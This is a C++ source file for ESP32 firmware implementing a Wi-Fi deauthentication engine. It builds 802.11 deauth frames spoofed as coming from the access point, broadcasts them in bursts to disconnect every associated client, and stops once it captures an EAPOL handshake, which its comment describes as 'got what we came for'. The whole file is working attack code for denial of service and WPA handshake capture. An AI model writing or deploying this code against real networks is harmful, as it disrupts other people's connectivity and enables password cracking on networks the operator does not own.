#include "DeauthEngine.h"

#include <Arduino.h>
#include <Logging.h>
#include <esp_wifi.h>

#include <cstring>

#include "TargetList.h"

DeauthEngine deauthEngine;

namespace {
// 802.11 deauthentication frame: fixed 24-byte MAC header plus a 2-byte reason code, no frame
// body beyond that and no FCS (esp_wifi_80211_tx's radio appends the FCS in hardware).
struct __attribute__((packed)) DeauthFrame {
  uint16_t frameControl;  // 0x00C0 on this little-endian MCU -> wire bytes {0xC0, 0x00}: management/deauth
  uint16_t durationId;
  uint8_t addr1[6];  // destination
  uint8_t addr2[6];  // source (spoofed as the AP, so clients trust it)
  uint8_t addr3[6];  // BSSID
  uint16_t seqCtrl;   // left at 0; en_sys_seq=true below tells the driver to fill in a real one
  uint16_t reasonCode;
};

constexpr uint16_t kFrameControlDeauth = 0x00C0;
constexpr uint16_t kReasonClass3FromNonassoc = 0x0007;
}  // namespace

bool DeauthEngine::begin() {
  memset(trackers, 0, sizeof(trackers));
  totalBursts = 0;
  totalFrames = 0;
  return true;
}

void DeauthEngine::setEnabled(bool value) {
  if (enabled == value) return;
  enabled = value;
  LOG_INF("DEAUTH", "Active deauth %s", enabled ? "enabled" : "disabled");
}

DeauthEngine::BssidTrack& DeauthEngine::trackerFor(uint32_t bssidHash) {
  int freeSlot = -1;
  for (size_t i = 0; i < kTrackCapacity; i++) {
    if (trackers[i].inUse && trackers[i].bssidHash == bssidHash) return trackers[i];
    if (freeSlot < 0 && !trackers[i].inUse) freeSlot = static_cast<int>(i);
  }
  const size_t slot = freeSlot >= 0 ? static_cast<size_t>(freeSlot) : 0;  // evict slot 0 if all in use
  trackers[slot] = BssidTrack{bssidHash, 0, false, true};
  return trackers[slot];
}

bool DeauthEngine::sendDeauthBurst(const MacAddress& bssid, uint8_t channel) {
  DeauthFrame frame{};
  frame.frameControl = kFrameControlDeauth;
  frame.durationId = 0;
  memset(frame.addr1, 0xFF, 6);  // broadcast: deauth every client currently associated to this BSSID at once
  memcpy(frame.addr2, bssid.bytes, 6);
  memcpy(frame.addr3, bssid.bytes, 6);
  frame.seqCtrl = 0;
  frame.reasonCode = kReasonClass3FromNonassoc;

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  bool anyFailed = false;
  for (uint8_t i = 0; i < kFramesPerBurst; i++) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), true) != ESP_OK) {
      anyFailed = true;
    }
    totalFrames++;
    delay(2);
  }
  totalBursts++;
  return !anyFailed;
}

void DeauthEngine::onObservation(const WifiObservation& obs) {
  if (!enabled) return;
  if (obs.kind != WifiFrameKind::Beacon && obs.kind != WifiFrameKind::ProbeResponse &&
      obs.kind != WifiFrameKind::EapolHandshake) {
    return;  // only BSSID-confirming frames (beacon/probe-resp) and handshake frames feed targeting
  }

  const uint32_t bssidHash = obs.bssid.fnv1a();
  BssidTrack& track = trackerFor(bssidHash);

  if (obs.kind == WifiFrameKind::EapolHandshake) {
    track.handshakeSeen = true;  // got what we came for — stop attacking this BSSID
    return;
  }

  if (track.handshakeSeen) return;
  if (!targetList.isAllowed(obs.bssid)) return;

  const unsigned long now = millis();
  if (track.lastBurstMs != 0 && now - track.lastBurstMs < kCooldownMs) return;
  track.lastBurstMs = now;

  LOG_INF("DEAUTH", "Deauth burst: %02X:%02X:%02X:%02X:%02X:%02X ch%u", obs.bssid.bytes[0], obs.bssid.bytes[1],
          obs.bssid.bytes[2], obs.bssid.bytes[3], obs.bssid.bytes[4], obs.bssid.bytes[5], obs.channel);
  sendDeauthBurst(obs.bssid, obs.channel);
}
